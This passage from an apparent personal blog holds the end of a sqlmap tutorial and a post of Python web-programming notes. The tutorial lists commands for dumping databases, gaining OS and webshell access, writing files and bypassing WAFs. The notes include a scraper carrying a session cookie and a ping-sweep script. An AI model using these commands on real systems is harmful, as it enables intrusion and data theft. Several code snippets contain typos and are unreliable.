<li>Microsoft SQL Server（库1：（表1，表2，表3），库2，库3）</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code>sqlmap.py -u &quot;URL&quot; --currrent-db
//获取当前URL的数据库名
sqlmap.py -u &quot;URL&quot; --current-user
//获取此数据库的用户名
</code></pre><ul>
<li><p>5.获取数据量和用户权限</p>
<ul>
<li><p>获取数据库的数据量</p>
<ul>
<li><p>拿到了数据库但无法查看怎么办</p>
<pre><code>sqlmap.py -u &quot;URL&quot; --count -D &quot;数据库名&quot;
</code></pre></li>
</ul>
</li>
<li><p>判断用户的权限</p>
<ul>
<li><p>最高权限：增删改查、写入读取文件、执行系统命令</p>
<pre><code>sqlmap.py -u &quot;URL&quot; --privileges
//查看用户权限
</code></pre></li>
<li><p>也可以通过查看数据库的用户名来判断权限</p>
<ul>
<li>Microsoft SQL Server ：sa</li>
<li><p>Mysql：root</p>
<pre><code>sqlmap.py -u &quot;URL&quot; --current-user
</code></pre></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>6.Mysql数据库的注入</p>
<ul>
<li><p>Mysql数据库的结构<br>  mysql数据库结构:<br>  (<br>  库1：（表，列，数据or字段内容），<br>  库2：（表，列，数据or字段内容），<br>  库3：（表，列，数据or字段内容）<br>  )</p>
</li>
<li><p>Mysql注入（四步）</p>
<pre><code>sqlmap.py -u &quot;URL&quot; --current-db  //获取库名
sqlmap.py -u &quot;URL&quot; --tables-D &quot;数据库名&quot; //获取该库中的表名
sqlmap.py -u &quot;URL&quot; --columns-T &quot;表名&quot; //获取某个表名的列名
sqlmap.py -u &quot;URL&quot; --dump -C &quot;列名1(,列名2)&quot;-T &quot;表名&quot; //获取字段内容
</code></pre></li>
<li>思考：新的数据库注入<ul>
<li>有两款新的数据库类型sqlmap不支持（使用NoSQLMap即可）<ul>
<li>MongoDB</li>
<li>NoSQL</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>7.管理自己的数据库</p>
<ul>
<li><p>如何随时链接自己的数据库</p>
<pre><code>sqlmap.py -d &quot;mysql://用户名:密码@地址:端口/数据库名&quot;
例如：
sqlmap.py -d &quot;mysql://root:root@localhost:3306/test&quot;
//如果报错，那就是没有安装pymysql（百度）
</code></pre></li>
<li><p>管理自己的数据库</p>
<pre><code>sqlmap.py -d &quot;mysql://root:root@localhost:3306/test&quot; --sql-shell
得到：
sql-shell &gt;            //等待输入，即可管理
</code></pre></li>
</ul>
</li>
<li><p>8.延时注入</p>
<ul>
<li><p>延时注入在什么情况下使用</p>
<ul>
<li>在我们挖掘SQL注入漏洞的过程中，页面无变化，无法用bool真假判断，无法报错的情况下使用延时注入</li>
<li>最精准，耗时长</li>
</ul>
</li>
<li><p>如何进行延时注入(二者均可)</p>
<pre><code>sqlmap.py -u &quot;URL&quot; --delay 数值（延时的秒数）
sqlmap.py -u &quot;URL&quot; -safe-freq
</code></pre></li>
</ul>
</li>
<li><p>9.交互式命令执行和写webshell</p>
<ul>
<li>什么是交互式（必须是最高权限）<ul>
<li>和数据库or “URL”网址的服务器，进行交互</li>
</ul>
</li>
<li><p>SQLMAP进行命令执行（提权）</p>
<pre><code>sqlmap.py -u &quot;URL&quot; --os-cmd=&quot;命令&quot;
//注意在是使用交互式参数时要知道网站的绝对路径，命令执行后设置中又一个需要你输入绝对路径： d:/www/    ，当我们执行命令是SQLMAP是创建了一个文件在绝对路径之下的，但是执行完之后就自动删除了
</code></pre></li>
<li><p>SQLMAP写webshell and （提权）</p>
<pre><code>sqlmap.py -u &quot;URL&quot; --os-shell
//教程一路设置4----2---d:/www/----仅供参考
得到：
os-shell &gt;
</code></pre></li>
</ul>
</li>
<li><p>10.Tamper脚本的介绍和使用</p>
<ul>
<li>What is Tamper?<ul>
<li>sqlmap目录下的tamper，里面的脚本有不同的功能来帮助我们使用sqlmap进行高级的SQL注入测试，如：绕过waf</li>
</ul>
</li>
<li><p>小试Tamper脚本</p>
<ul>
<li><p>常规办法（and 1=1）无法注入时</p>
<pre><code>sqlmap.py -u &quot;URL&quot; --temper=&quot;randomcase.py&quot;(脚本名称)
</code></pre></li>
</ul>
</li>
<li>Tamper脚本总结<ul>
<li>各种temper脚本用法</li>
<li><a href="http://pan.baidu.com/s/1dF0ywFn" target="_blank" rel="noopener">http://pan.baidu.com/s/1dF0ywFn</a>    密码：jp29</li>
</ul>
</li>
</ul>
</li>
<li><p>10.本地写入webshell</p>
<ul>
<li>什么是本地写入webshell<ul>
<li>上传自己本地自定义的文件</li>
</ul>
</li>
<li><p>本地写入webshell</p>
<ul>
<li>在sqlmap目录下创建一个目录（mst）在目录下创建自己想要上传的文件</li>
<li>需要最高权限</li>
<li><p>需要两个参数</p>
<ul>
<li>本地文件的(路径)地址<ul>
<li>–file-write “./mst/mst.txt”</li>
</ul>
</li>
<li><p>目标文件的(路径)地址</p>
<ul>
<li><p>–file-dest “d:/www/1.html</p>
<p>  sqlmap.py -u “URL” –file-write “./mst/mst.txt” –file-dest “d:/www/1.html”</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>11.批量检测注入漏洞</p>
<ul>
<li>你对批量知多少<ul>
<li>将所有的链接写在一个txt文档中，批量检测</li>
</ul>
</li>
<li><p>批量检测给你招</p>
<pre><code>sqlmap.py -m g:\ceshi\test.txt(绝对路径)
</code></pre></li>
<li>结合BurpSuite进行批量<ul>
<li>通过BurpSuite记录一些对网址的请求数据包，设置options– &gt;  misc  –&gt;  Proxy中选中Request  -&gt;  设置保存文件名（test.log），在浏览器中设置好代理，通过Proxy模块监听，之后在test.log中就会有记录</li>
<li><pre><code>sqlmap.py -l g:\ceshi\test.log --batch -smart
//--batch:自动选择yes；-smart:启发式快速判断；--level=(1-5) :要执行的探测水平等级;--risk=(0-3):测试执行的风险等级
</code></pre><ul>
<li>探测等级：–level；共有五个等级，默认为1，sqlmap使用的payload可以在xml/payloads中看到，你也可以根据相应的格式自己添加payload。这个参数不仅影响之前使用的那些payload同事也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候都会测试，HTTP User-Agent/Referer头在level为3的时候就会测试，在不确定那个payload或者参数为注入点的时候建议用高level值</li>
<li>风险等级：–risk；共有四个风险等级默认1，测试大部分语句，2增加基于时间的测试语句，3增加OR语句的SQL注入测试，例如，有时候在UPDATE的语句中，注入一个OR的测试语句，可能导致更新整个表，造成很大的风险，同样在xml/payloads/中找到，也可以自行添加payload</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>12.SQLMAP注入学习</p>
<ul>
<li>了解sqlmap目录结构<ul>
<li>doc/—&gt;&gt;&gt;&gt;sqlmap具体使用说明</li>
<li>extra/—&gt;&gt;&gt;&gt;sqlmap的额外功能</li>
<li>lib/—&gt;&gt;&gt;&gt;sqlmap多种链接库</li>
<li>plugins/—&gt;&gt;&gt;&gt;各种数据库信息和数据库通用事项</li>
<li>procs/—&gt;&gt;&gt;&gt;mssqlserver、mysql、Oracle、postgresql的出发程序</li>
<li>shell/—&gt;&gt;&gt;&gt;注入成功后多种shell远程连接命令执行的管理数据库</li>
<li>tamper/—&gt;&gt;&gt;&gt;绕过脚本</li>
<li>thirdparty/—&gt;&gt;&gt;&gt;第三方插件</li>
<li>txt/—&gt;&gt;&gt;&gt;字典</li>
<li>udf/—&gt;&gt;&gt;&gt;用户自定义的攻击载荷</li>
<li>waf/—&gt;&gt;&gt;&gt;常见的防火墙特征，使用–identify-waf进行检测</li>
<li>xml/—&gt;&gt;&gt;&gt;数据库的注入检测载荷、旗标信息以及其他信息，可以通过查看分析该文件学习注入技术</li>
</ul>
</li>
<li>学习sqlmap注入<ul>
<li>-v参数的使用，7个等级，<ul>
<li>0：只显示Python错误以及严重的信息；</li>
<li>1：同时显示信息和警告信息；</li>
<li>2：同时显示debug信息；</li>
<li>3：同时显示注入的payload；</li>
<li>4：同时显示HTTP请求；</li>
<li>5：同时显示HTTP响应头；</li>
<li>6：同时显示HTTP相应页面</li>
</ul>
</li>
<li><pre><code>sqlmap.py -u &quot;URL&quot; --dbs -v 3
</code></pre></li>
<li>调用BurpSuite(也要配置代理)</li>
<li><pre><code>sqlmap.py -u &quot;URL&quot; --proxy=&quot;http://127.0.0.1:8080&quot;
</code></pre></li>
</ul>
</li>
</ul>
</li>
</ul>

          
        
      
    </div>

    

    
    
    
    <div>
      
    </div>
    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://github.com/JD1412/JD1412.github.io.git/2019/01/14/Python-Web编程/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Healer">
      <meta itemprop="description" content="桃李不言，下自成蹊">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="JD1412">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2019/01/14/Python-Web编程/" class="post-title-link" itemprop="url">Python Web编程</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              

              
                
              

              <time title="创建时间：2019-01-14 06:14:39 / 修改时间：06:15:28" itemprop="dateCreated datePublished" datetime="2019-01-14T06:14:39+08:00">2019-01-14</time>
            

            
              

              
            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/programming/" itemprop="url" rel="index"><span itemprop="name">编程</span></a></span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<h1 id="Python-编程"><a href="#Python-编程" class="headerlink" title="Python 编程"></a>Python 编程</h1></blockquote>
<ul>
<li>查看源代码   <code>print help(base64)</code> or <code>print base64.__file__</code></li>
</ul>
<blockquote>
<h2 id="Python正则表达式"><a href="#Python正则表达式" class="headerlink" title="Python正则表达式"></a>Python正则表达式</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">pattern = re.compile(<span class="string">'hello'</span>)</span><br><span class="line">match = pattern.match(<span class="string">'hello world!'</span>)</span><br></pre></td></tr></table></figure>
</blockquote>
<p>或者<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">word = re.findall(<span class="string">'hello'</span>.<span class="string">'hello word'</span>)</span><br></pre></td></tr></table></figure></p>
<pre><code>|一般字符|功能|正则表达式|匹配结果|
|-------|----|----|-----|
|  **.**   |   匹配任意换行符以外的字符  |   h.  |  ht or hb ... |
|  **\\**  |  转义字符   |  \\\\ |  \    |
|  **[...]** | 字符集，对应位置可以是字符，也可以是范围，第一个字符如果是‘^’则表示取反，所有特殊字符在字符集中均失去原有含义，使用是可以加反斜杠  | [0-9] |616 or ...|
| **\d**  |  匹配数字 |  a\dc   | a1c  |
| **\D**  |  匹配非数字   |     |
| **\s** |   空白字符 [&lt;空格&gt;\t\r\f\v] |  a\sb   | a b |
| **\S**  | 非空白字符 [^\s]   |   |
| **\w** | 单词字符 [A-Za_z0-9] | a\wc  |  abc  |
| **\W** | 非单词字符 [^\w] |   |
| **\***  | 匹配前一个字符0次或无限次  | abc*   |  ab  or  abcccccc |
| **+** |  匹配前一个字符1次或无限次 | abc+   |  abc  or  abcccccc |
|  **?**|  匹配前一个字符0次或1次 |  abc?    | ab  or  abc   |
| **{m}**  |  匹配前一个字符m次 |  ab{3}c  | abbbc|
|  **{m,n}**  |  匹配前一个字符m次至n次 | ab{1,2}c   | abc  or abbc|
|  **\|**  | 表示匹配左右两个表达是中的一个,先左后右，左边成功则结束，如果‘\|’没有包含在（）中则它的范围是整个正则表达式  | abc\|abf  |  abc or def|
| **(..)**  | 被括起来的表达式作为一个分组，\|的范围仅仅在括号内  | (abc){2}a(123\|456)c    |abcabca123c|
</code></pre><ul>
<li><h3 id="Python编译选项指定"><a href="#Python编译选项指定" class="headerlink" title="Python编译选项指定"></a>Python编译选项指定</h3><p>  |使用方法|功能|<br>  |——-|—-|<br>  | <strong>re.I</strong>  |  忽略大小写   |<br>  | <strong>re.L</strong>  | 使用预定义字符类\w\W\b\B\s\S取决当前区域设定  |<br>  | <strong>re.M</strong>  | 多行模式改变‘^’和‘$’的行为  |   |<br>  | <strong>re.S</strong>  | .任意匹配模式 |<br>  | <strong>re.U</strong>  | 使用预定义字符类\w\W\b\B\s\S\d\D取决于Unicode定义的字符属性 |<br>  | <strong>re.X</strong>  | 详细模式，可以多行，忽略空白字符，并且可以加入注释  |</p>
</li>
<li><p>贪婪模式与非贪婪模式</p>
</li>
</ul>
<blockquote>
<h2 id="Python-Web编程"><a href="#Python-Web编程" class="headerlink" title="Python Web编程"></a>Python Web编程</h2></blockquote>
<ul>
<li><h3 id="urllib"><a href="#urllib" class="headerlink" title="urllib"></a>urllib</h3><ul>
<li>urllib.urlopen()</li>
<li>urllib.urlretrieve() <code>下载文件</code><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlretrieve(url , filename=<span class="keyword">None</span> , reporthook=<span class="keyword">None</span> , data=<span class="keyword">None</span>)</span><br><span class="line">For example:</span><br><span class="line">urlretrieve(<span class="string">"https://www.baidu.com/img/bd_logo1.png"</span> , filename=Document/temp/baidu.png)</span><br><span class="line">filename是文件下载后保存的地址</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><h3 id="urllib2"><a href="#urllib2" class="headerlink" title="urllib2"></a>urllib2</h3><ul>
<li>urllib2.urlopen()</li>
<li>urllib2.Requests()  <code>定制请求头等</code></li>
</ul>
</li>
<li><h3 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h3><p>  第三方库文件，需要安装<code>pip install requests</code></p>
<ul>
<li><h4 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h4>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(&quot;https://www.baidu.com/&quot;)</span><br><span class="line">r = requests.post(&quot;https://www.baidu.com/&quot;)</span><br><span class="line">r = requests.put(&quot;https://www.baidu.com/&quot;)</span><br><span class="line">r = requests.delete(&quot;https://www.baidu.com/&quot;)</span><br><span class="line">r = requests.head(&quot;https://www.baidu.com/&quot;)</span><br><span class="line">r = requests.options(&quot;https://www.baidu.com/&quot;)</span><br></pre></td></tr></table></figure>
</li>
<li><h4 id="为URL传递参数"><a href="#为URL传递参数" class="headerlink" title="为URL传递参数"></a>为URL传递参数</h4>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;&apos;key1&apos;:&apos;value1&apos;,&apos;key2&apos;:&apos;value2&apos;&#125;</span><br><span class="line">r = requests.get(&quot;https://www.baidu.com&quot;,params = payload )</span><br><span class="line">print (url)</span><br><span class="line">    https://www.baidu.com?key2=value2&amp;key1=value1</span><br></pre></td></tr></table></figure>
</li>
<li><h4 id="响应内容"><a href="#响应内容" class="headerlink" title="响应内容"></a>响应内容</h4>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(&quot;https://www.baidu.com/&quot;)</span><br><span class="line">r.text</span><br><span class="line">r.encode&apos;utf-8&apos;</span><br><span class="line">r.encode = &apos;ISO-8859-1&apos;</span><br></pre></td></tr></table></figure>
</li>
<li><h4 id="二进制响应内容"><a href="#二进制响应内容" class="headerlink" title="二进制响应内容"></a>二进制响应内容</h4>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(&quot;https://www.baidu.com/&quot;)</span><br><span class="line">r.content</span><br></pre></td></tr></table></figure>
</li>
<li><h4 id="定制请求头"><a href="#定制请求头" class="headerlink" title="定制请求头"></a>定制请求头</h4>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;https://www.baidu.com/&quot;</span><br><span class="line">headers = &#123;&apos;content-type&apos;:&apos;application/json&apos;&#125;</span><br><span class="line">r = repuests.get(url,headers=headers)</span><br><span class="line">header中可以加入cookie</span><br></pre></td></tr></table></figure>
</li>
<li><h4 id="复杂的post请求"><a href="#复杂的post请求" class="headerlink" title="复杂的post请求"></a>复杂的post请求</h4>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &#123;&apos;key1&apos;:&apos;value1&apos;,&apos;key2&apos;:&apos;value2&apos;&#125;</span><br><span class="line">r = requests.post(&quot;https://www.baidu.com/post&quot;,data = payload)</span><br></pre></td></tr></table></figure>
</li>
<li><h4 id="响应状态码"><a href="#响应状态码" class="headerlink" title="响应状态码"></a>响应状态码</h4>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(&quot;https://www.baidu.com/&quot;)</span><br><span class="line">r.status_code</span><br></pre></td></tr></table></figure>
</li>
<li><h4 id="响应头"><a href="#响应头" class="headerlink" title="响应头"></a>响应头</h4>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.headers</span><br></pre></td></tr></table></figure>
</li>
<li><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r.cookies</span><br><span class="line">r.cookies[&apos;example cookie name&apos;]</span><br></pre></td></tr></table></figure>
</li>
<li><h4 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h4>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.get(&quot;https://www.baidu.com/post&quot;,timeout = 0.001)</span><br></pre></td></tr></table></figure>
</li>
<li><h4 id="错误和异常"><a href="#错误和异常" class="headerlink" title="错误和异常"></a>错误和异常</h4>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">遇到网络问题时（如：DNS查询失败，拒绝链接等），Requests会抛出一个ConnectionError异常。遇到罕见的无效HTTP响应时，Requests则会抛出一个HTTPError异常，若请求超时，则会抛出Timeout异常</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spider</span><span class="params">(url, data)</span>:</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'Host'</span>: <span class="string">'www.ichunqiu.com'</span>,</span><br><span class="line">        <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0'</span>,</span><br><span class="line">        <span class="string">'Accept'</span>: <span class="string">'application/json, text/javascript, */*; q=0.01'</span>,</span><br><span class="line">        <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span>,</span><br><span class="line">        <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span>,</span><br><span class="line">        <span class="string">'Referer'</span>: <span class="string">'https://www.ichunqiu.com/courses'</span>,</span><br><span class="line">        <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded; charset=UTF-8'</span>,</span><br><span class="line">        <span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span>,</span><br><span class="line">        <span class="string">'Content-Length'</span>: <span class="string">'94'</span>,</span><br><span class="line">        <span class="string">'Cookie'</span>: <span class="string">'ci_session=da3cb5472ee493e4cab3f607c2eb1376d8d8f1ec; chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; __jsluid=227eea42ddcdc5dfd20ce94113679b2a; UM_distinctid=161d204f2129-01b579968a5537-4c322172-1fa400-161d204f214d5; CNZZDATA1262179648=831575282-1519646472-%7C1519651893; pgv_pvi=9857672192; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1519646998,1519647981,1519654917,1519655470; pgv_si=s9058514944; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1519655470'</span>,</span><br><span class="line">        <span class="string">'Connection'</span>: <span class="string">'close'</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    r = requests.post(url=url,headers=headers, data=data)</span><br><span class="line">    <span class="comment">#print (r.text)</span></span><br><span class="line">    data = json.loads(r.text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data[<span class="string">'course'</span>][<span class="string">'result'</span>])):</span><br><span class="line">        <span class="keyword">print</span> data[<span class="string">'course'</span>][<span class="string">'result'</span>][i][<span class="string">'courseName'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">18</span> ):</span><br><span class="line">    url = <span class="string">'https://www.ichunqiu.com/courses/ajaxCourses'</span></span><br><span class="line">    data = &#123;<span class="string">'pageIndex'</span>:<span class="string">'0'</span>&#125;</span><br><span class="line">    page = str(i)</span><br><span class="line">    data[<span class="string">'pageIndex'</span>] = page</span><br><span class="line">    spider(url, data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print courses_dict[0].encode('utf-8')</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<blockquote>
<h2 id="Python多线程编程"><a href="#Python多线程编程" class="headerlink" title="Python多线程编程"></a>Python多线程编程</h2></blockquote>
<ul>
<li><p><strong>thread</strong>       模块使用这种方法一定要加上<code>time.sleep()</code></p>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start_new_thread(function,args kwargs=<span class="keyword">None</span>)</span><br></pre></td></tr></table></figure>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"hello world! %s"</span>%time.ctime())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    thread.start_new_thread(fun1, ())</span><br><span class="line">    thread.start_new_thread(fun1, ())</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#对该网段内存活的主机进行探测</span></span><br><span class="line"><span class="keyword">import</span> thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> subpocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">        ip = <span class="string">'192.168.43.'</span>+str(i)</span><br><span class="line">        thread.start_new_thread(ping_check, (ip, ))</span><br><span class="line">        time.sleelp(<span class="number">0.01</span>)</span><br><span class="line">    ping_check()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping_check</span><span class="params">(ip)</span>:</span></span><br><span class="line">    check = Popen([<span class="string">'bin/bash'</span>, <span class="string">'-c'</span>, <span class="string">'ping -c 2'</span>+ip], stdin=PIPE, stout=PIPE)</span><br><span class="line">    data = check.stout.read()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'ttl'</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'%s is UP'</span>%ip</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span><span class="params">(keys)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'Hello %s:%s'</span>%(keys, time.time()))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    threads = []</span><br><span class="line">    keys = [<span class="string">'lixu'</span>, <span class="string">'hancong'</span>, <span class="string">'tianhao'</span>]</span><br><span class="line">    threads_count = len(keys)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads_count):</span><br><span class="line">        t = threading.Thread(target=fun1, args=(keys[i], ))</span><br><span class="line">        threads.append(t)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads_count):</span><br><span class="line">        threads[i].start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(threads_count):</span><br><span class="line">        threads[i].join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
